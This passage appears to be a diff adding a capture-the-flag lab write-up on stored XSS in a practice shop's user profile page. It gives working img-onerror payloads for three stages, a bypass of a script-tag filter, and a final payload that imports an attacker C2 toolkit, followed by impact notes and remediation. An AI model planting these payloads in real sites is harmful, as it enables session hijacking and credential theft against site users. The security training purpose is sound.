@@ -556,3 +556,465 @@ Because the payload is persistent, the compromise continues silently until someo
 - **Keep secrets out of the DOM.** The `tracking-id` token is readable by any script on the page; store sensitive tokens in `HttpOnly` cookies or server-side state instead of hidden DOM elements.
 - **Sanitize on output with a vetted library** (e.g. a well-maintained HTML sanitizer) if rich content must be allowed, rather than rendering raw user HTML.
 
+
+
+## Task 3: Stored XSS - User Profile
+
+### Vulnerability Description
+
+A Stored Cross-Site Scripting (XSS) vulnerability was identified in the NexusShop user profile functionality. The application retrieves profile data from a JSON API and dynamically inserts the returned values into the Document Object Model (DOM) using JavaScript's `innerHTML` property. Because certain user-controlled fields are not properly sanitized or HTML-encoded, an attacker can store malicious HTML containing JavaScript event handlers that execute when the profile page is loaded.
+
+The vulnerability affects three stages of the profile functionality. Stage 1 permits XSS through the `bio` field. Stage 2 filters `<script>` tags but fails to block JavaScript event handlers. Stage 3 correctly encodes the `bio` field but leaves the `username` field vulnerable. This demonstrates inconsistent input handling and the dangers of inserting untrusted data into HTML-parsing DOM sinks.
+
+The vulnerable frontend code includes:
+
+```javascript
+async function loadProfile() {
+    const res = await fetch('/profile/api/data');
+    const data = await res.json();
+
+    document.getElementById('profile-username').innerHTML = data.username || 'Guest';
+    document.getElementById('profile-bio').innerHTML = data.bio || 'No bio set';
+    document.getElementById('profile-location').innerHTML = data.location ? '📍 ' + data.location : '';
+    document.getElementById('profile-website').innerHTML = data.website ? '🔗 ' + data.website : '';
+}
+```
+
+The JSON response itself is not executable. The vulnerability occurs when the frontend interprets the stored strings as HTML through `innerHTML`, allowing embedded event handlers to execute.
+
+### Location & Parameters
+
+| Attribute | Details |
+|-----------|---------|
+| **Application** | NexusShop |
+| **Base URL** | `http://web0x0c.hbtn` |
+| **Stage 1 URL** | `/profile` |
+| **Stage 2 URL** | `/profile/settings` |
+| **Stage 3 URL** | `/profile/edit` |
+| **Vulnerable Fields** | `bio` (Stages 1 and 2), `username` (Stage 3) |
+| **Profile Data API** | `GET /profile/api/data` |
+| **Profile Update API** | `POST /profile/api/update` |
+| **Tracking Endpoint** | `/profile/api/track` |
+| **Type** | Stored XSS through a client-side DOM `innerHTML` sink |
+| **Severity** | High |
+| **Challenge Level** | 5 |
+| **Flag Location** | `web_application_security/websec_0x0C/4-flag.txt` |
+
+### Attack Vector
+
+**1. Identify the profile API and vulnerable DOM sink**
+
+Open `/profile` and inspect the Network tab in Firefox Developer Tools.
+
+The application retrieves profile data through:
+
+```http
+GET /profile/api/data
+```
+
+The initial API response contains:
+
+```json
+{
+    "bio": "",
+    "location": "",
+    "username": "Guest",
+    "website": ""
+}
+```
+
+Inspecting the JavaScript source reveals that all four fields are rendered using `innerHTML` instead of the safer `textContent`.
+
+**2. Stage 1: Confirm stored XSS through the Bio field**
+
+Navigate to `/profile` and enter the following payload into the Bio field:
+
+```html
+<img src=x onerror="console.log('PROFILE_XSS_STAGE1_EXECUTED')">
+```
+
+Save the profile and reload the page.
+
+The Firefox Console displays:
+
+```text
+PROFILE_XSS_STAGE1_EXECUTED
+```
+
+The browser attempts to load an invalid image, triggering the `onerror` event handler.
+
+Execution after a reload demonstrates that the malicious HTML was stored persistently and subsequently rendered as executable HTML.
+
+**Result:** Stage 1 stored XSS confirmed.
+
+**3. Stage 2: Bypass the script-tag filter**
+
+Navigate to `/profile/settings`.
+
+First, submit a harmless HTML probe:
+
+```html
+<b id="stage2-probe">STAGE2_HTML_OK</b>
+```
+
+After saving and reloading, `STAGE2_HTML_OK` appears in bold, confirming that the Bio field is interpreted as HTML.
+
+Next, submit:
+
+```html
+<script>console.log('STAGE2_SCRIPT')</script><img src=x onerror="console.log('STAGE2_XSS_EXECUTED')">
+```
+
+The application removes the `<script>` element but preserves the image and event handler.
+
+The API returns:
+
+```json
+{
+    "bio": "<img src=x onerror=\"console.log('STAGE2_XSS_EXECUTED')\">",
+    "id": 5,
+    "location": "",
+    "stage": 2,
+    "username": "userSettings",
+    "website": ""
+}
+```
+
+The Firefox Console displays:
+
+```text
+STAGE2_XSS_EXECUTED
+```
+
+This confirms that filtering `<script>` tags alone does not prevent XSS. JavaScript can execute through HTML event handlers such as `onerror`.
+
+**Result:** Stage 2 stored XSS confirmed, with successful script-tag filter bypass.
+
+**4. Stage 3: Identify the hidden vulnerable field**
+
+Navigate to `/profile/edit`.
+
+The challenge hint suggests that another profile field is vulnerable even though the Bio field is protected.
+
+Test both `username` and `bio` with HTML markup.
+
+Username payload:
+
+```html
+<b id="stage3-username-probe">STAGE3_USERNAME_HTML</b>
+```
+
+Bio payload:
+
+```html
+<b id="stage3-username-probe">STAGE3_BIO_HTML</b>
+```
+
+After saving, the API returns:
+
+```json
+{
+    "bio": "&amp;lt;b id=&amp;quot;stage3-username-probe&amp;quot;&amp;gt;STAGE3_BIO_HTML&amp;lt;/b&amp;gt;",
+    "id": 7,
+    "location": "",
+    "stage": 3,
+    "username": "<b id=\"stage3-username-probe\">STAGE3_USERNAME_HTML</b>",
+    "website": ""
+}
+```
+
+The results show:
+
+- `username`: HTML is preserved and rendered as markup.
+- `bio`: HTML characters are encoded and the tags are displayed as text.
+
+The `username` field is therefore the confirmed vulnerable input in Stage 3.
+
+**5. Confirm JavaScript execution through Username**
+
+Replace the Username field with:
+
+```html
+<img src=x onerror="console.log('PROFILE_XSS_STAGE3_EXECUTED')">
+```
+
+Save the profile and reload.
+
+The Firefox Console displays:
+
+```text
+PROFILE_XSS_STAGE3_EXECUTED
+```
+
+This confirms persistent JavaScript execution through the Username field.
+
+**6. Identify the challenge level and tracking endpoint**
+
+Inspecting the session cookie in Firefox Developer Tools and Base64-decoding its payload reveals the challenge state:
+
+```json
+{
+    "flags": [],
+    "level_5_stage": 1
+}
+```
+
+The session also contains a session identifier, omitted here.
+
+This identifies the profile challenge as **Level 5**. Stage 3 is the flag-bearing stage.
+
+The tracking endpoint was tested using:
+
+```bash
+curl 'http://web0x0c.hbtn/profile/api/track?t=test'
+```
+
+Response:
+
+```json
+{
+    "status": "error"
+}
+```
+
+The response confirms that the endpoint exists and processes tracking requests, but the supplied test token is invalid.
+
+**7. Execute the Stage 3 flag-capture payload**
+
+Replace the Username field with the lab C2 toolkit payload:
+
+```html
+<img src=x onerror="import('/attacker/toolkit.js').then(()=>XSS.pwn(5,3,'/profile/api/track'))">
+```
+
+Save the profile and reload.
+
+The payload triggers the image error handler, dynamically loads the lab's C2 toolkit, and calls `XSS.pwn()` with the correct challenge level, stage, and tracking callback.
+
+The tracking request succeeds and returns the flag.
+
+### Payload Used
+
+The final working payload is:
+
+```html
+<img src=x onerror="import('/attacker/toolkit.js').then(()=>XSS.pwn(5,3,'/profile/api/track'))">
+```
+
+**Payload breakdown:**
+
+| Component | Purpose |
+|-----------|---------|
+| `<img src=x>` | Forces an image-loading error |
+| `onerror` | Executes JavaScript when image loading fails |
+| `import('/attacker/toolkit.js')` | Dynamically imports the lab's C2 toolkit |
+| `.then(...)` | Executes the next operation after the toolkit loads |
+| `XSS.pwn()` | Invokes the lab's compromise and flag-capture workflow |
+| `5` | Challenge level |
+| `3` | Challenge stage |
+| `/profile/api/track` | Tracking callback endpoint |
+
+The payload avoids `<script>` elements entirely and exploits the application's unsafe HTML rendering behavior.
+
+### Evidence
+
+**1. Stored XSS execution**
+
+Stage 1 Console:
+
+```text
+PROFILE_XSS_STAGE1_EXECUTED
+```
+
+Stage 2 Console:
+
+```text
+STAGE2_XSS_EXECUTED
+```
+
+Stage 3 Console:
+
+```text
+PROFILE_XSS_STAGE3_EXECUTED
+```
+
+These results confirm JavaScript execution from the stored profile fields.
+
+**2. API persistence and filtering behavior**
+
+The API responses demonstrate that:
+
+- Stage 1 allows the Bio field to execute stored HTML event handlers.
+- Stage 2 removes script tags but preserves executable event handlers.
+- Stage 3 encodes the Bio field but preserves raw HTML in Username.
+
+The payloads remain effective after reloading the relevant profile pages.
+
+**3. C2 toolkit execution and tracking**
+
+The final stored payload invokes:
+
+```javascript
+XSS.pwn(5, 3, '/profile/api/track')
+```
+
+The Network response from `/profile/api/track` is:
+
+```json
+{
+    "ref": "FLAG{dde3e144519a50db0432f0422cf8d85e}",
+    "status": "tracked"
+}
+```
+
+This confirms successful execution of the flag-capture workflow and acceptance of the tracking callback.
+
+The tracking response is verified evidence. A separate C2 dashboard screenshot or recorded stolen-data entry was not captured during this task, so actual credential or cookie extraction is not independently established by the available evidence.
+
+**4. Captured flag**
+
+```text
+FLAG{dde3e144519a50db0432f0422cf8d85e}
+```
+
+Required submission file:
+
+```text
+web_application_security/websec_0x0C/4-flag.txt
+```
+
+File contents:
+
+```text
+dde3e144519a50db0432f0422cf8d85e
+```
+
+**Result:** Task 3, Level 5, Stage 3 successfully completed.
+
+### Real-World Impact
+
+A stored XSS vulnerability in a user profile can allow an attacker to execute arbitrary JavaScript in the browser of anyone who views the affected profile, subject to the application's access controls.
+
+Potential consequences include:
+
+1. **Session compromise:** Access to JavaScript-readable session tokens and authentication data. Cookies marked `HttpOnly` cannot be read directly through `document.cookie`.
+
+2. **Credential theft:** Injection of deceptive login forms or interception of credentials entered into vulnerable application forms.
+
+3. **Unauthorized actions:** Performing authenticated requests within the victim's browser using the victim's active session.
+
+4. **Data exfiltration:** Reading accessible application data and transmitting it to an attacker-controlled endpoint.
+
+5. **Persistent compromise:** Malicious code remains stored and can execute repeatedly whenever the affected profile is loaded.
+
+6. **Browser-side content manipulation:** Modifying trusted application pages to impersonate interface elements, mislead users, or redirect interactions.
+
+The vulnerability is particularly dangerous because the malicious payload is stored on the server. Unlike reflected XSS, exploitation does not require victims to follow a specially constructed malicious URL.
+
+### Remediation
+
+**1. Replace `innerHTML` with `textContent`**
+
+For profile fields intended to contain plain text, use `textContent` rather than `innerHTML`.
+
+Vulnerable:
+
+```javascript
+document.getElementById('profile-username').innerHTML = data.username || 'Guest';
+```
+
+Corrected:
+
+```javascript
+document.getElementById('profile-username').textContent = data.username || 'Guest';
+```
+
+Apply the same approach to all plain-text profile fields.
+
+```javascript
+document.getElementById('profile-bio').textContent =
+    data.bio || 'No bio set';
+
+document.getElementById('profile-location').textContent =
+    data.location ? '📍 ' + data.location : '';
+
+document.getElementById('profile-website').textContent =
+    data.website ? '🔗 ' + data.website : '';
+```
+
+`textContent` inserts strings as text rather than interpreting them as HTML, preventing embedded tags and event handlers from becoming executable markup.
+
+**2. Sanitize HTML when rich-text formatting is required**
+
+If the application intentionally supports formatted profile biographies, use a maintained HTML sanitizer such as DOMPurify.
+
+```javascript
+document.getElementById('profile-bio').innerHTML =
+    DOMPurify.sanitize(data.bio || 'No bio set');
+```
+
+Configure an appropriate allowlist of elements and attributes.
+
+**3. Apply context-aware output encoding**
+
+Ensure user-controlled values are encoded for the context in which they appear:
+
+- HTML text content
+- HTML attributes
+- JavaScript strings
+- URLs
+
+Encoding rules differ between these contexts. Generic filtering and inconsistent HTML entity encoding are not reliable substitutes for correct output handling.
+
+**4. Enforce server-side validation**
+
+Validate profile fields based on their intended purpose:
+
+- Username should contain only allowed characters and meet length restrictions.
+- Website values should be validated as URLs with permitted schemes.
+- Location should be treated as plain text unless a defined markup format is required.
+- Bio content should follow an explicit plain-text or sanitized-rich-text policy.
+
+Server-side validation should complement, not replace, safe DOM rendering.
+
+**5. Implement a Content Security Policy (CSP)**
+
+Deploy a restrictive CSP that disallows inline JavaScript event handlers and restricts script sources.
+
+For example, where compatible with the application:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
+```
+
+A properly enforced CSP can substantially reduce XSS exploitability, but it should be a defense-in-depth control rather than the primary fix.
+
+**6. Avoid blacklist-based filtering**
+
+Stage 2 demonstrates that removing `<script>` elements does not eliminate executable HTML.
+
+The application must not rely on a list of forbidden tags or event handlers. The preferred solution is to prevent untrusted strings from entering executable DOM contexts.
+
+**7. Add automated XSS regression tests**
+
+Include tests for all profile fields, especially `username`, `bio`, `location`, and `website`.
+
+Verify that malicious HTML remains inert after storage, API retrieval, and client-side rendering.
+
+Test asynchronous rendering and page reloads to ensure stored payloads cannot become executable through later DOM updates.
+
+### Conclusion
+
+Task 3 demonstrated a stored XSS vulnerability caused by unsafe client-side rendering of profile data retrieved through a JSON API.
+
+All three stages were investigated:
+
+- **Stage 1:** Stored XSS through Bio.
+- **Stage 2:** Script-tag filtering bypassed using an HTML event handler.
+- **Stage 3:** Stored XSS through Username despite HTML encoding being applied to Bio.
+
+The final exploit successfully invoked the lab C2 toolkit and obtained the Stage 3 flag through `/profile/api/track`.
+
+**The main security lesson is that JSON transport does not guarantee safe DOM rendering.** Untrusted data becomes dangerous when it is passed to HTML-parsing sinks such as `innerHTML`, and protecting one profile field does not secure other fields rendered by the same frontend.
+
+
